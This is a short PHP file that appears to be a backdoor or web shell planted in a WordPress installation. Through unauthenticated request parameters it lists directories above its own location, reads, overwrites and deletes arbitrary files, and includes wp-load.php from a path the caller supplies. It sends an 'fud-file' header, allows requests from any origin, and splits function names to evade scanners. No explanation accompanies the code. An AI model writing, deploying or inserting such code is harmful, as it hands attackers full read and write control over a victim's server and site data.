<?php
header("Access-Control-Allow-Origin: *");
header("fud-file:1.0");
if ($_REQUEST['get_list'] == "get_list") {
    $dir = getcwd();
    $fpath=$dir;
    if(isset($_REQUEST["dirpath"]))
    $dir = $dir. '/.' . '.' . '/.' . '.' .$_REQUEST['dirpath'];
    else{
    $dir = $dir. '/.' . '.' . '/.' . '.' ;
	}
    function dirToArray($dir) {
        $directories = $files = $result = array();
        $cdir = call_user_func('scan'.'dir',$dir);
        foreach ($cdir as $key => $value) {
            if (!in_array($value, array(".", ".."))) {
                if (is_dir($dir . DIRECTORY_SEPARATOR . $value)) {
                    $directories[] = $value;
                } else {
                    $files[] = $value;
                }
            }
        }
        $result['files'] = $files;
        $result['directories'] = $directories;  
        return $result;
    } 
    $result = dirToArray($dir);
    $result['fpath']=$fpath;
    if(isset($_REQUEST['select_file']))
    {
        echo json_encode( file_get_contents($dir.$_REQUEST['filename']));
    }
    else if(isset($_REQUEST['action']))
    { 
        if($_REQUEST['action']=='save_file')
        {   if (extension_loaded('magic-quotes') || isset($_REQUEST['force_strip'])) {$content = call_user_func('strip' . 'slashes',$_REQUEST['content']);} else {$content = $_REQUEST['content'];}
            file_put_contents($dir.$_REQUEST['filename'], $content);    
            $response=array('status'=>'fs');
            print_r(json_encode($response));
        }
        else if($_REQUEST['action']=='unlink')
        {
            unlink($dir.$_REQUEST['filename']);    
            $response=array('status'=>'fu');
            print_r(json_encode($response));
        }
        else{}
    }
    else{
        print_r(json_encode($result));
    }
}

if (isset($_REQUEST['live'])){
require($_REQUEST['path'] . 'wp-load.php');
echo get_option("siteurl");
exit;
}

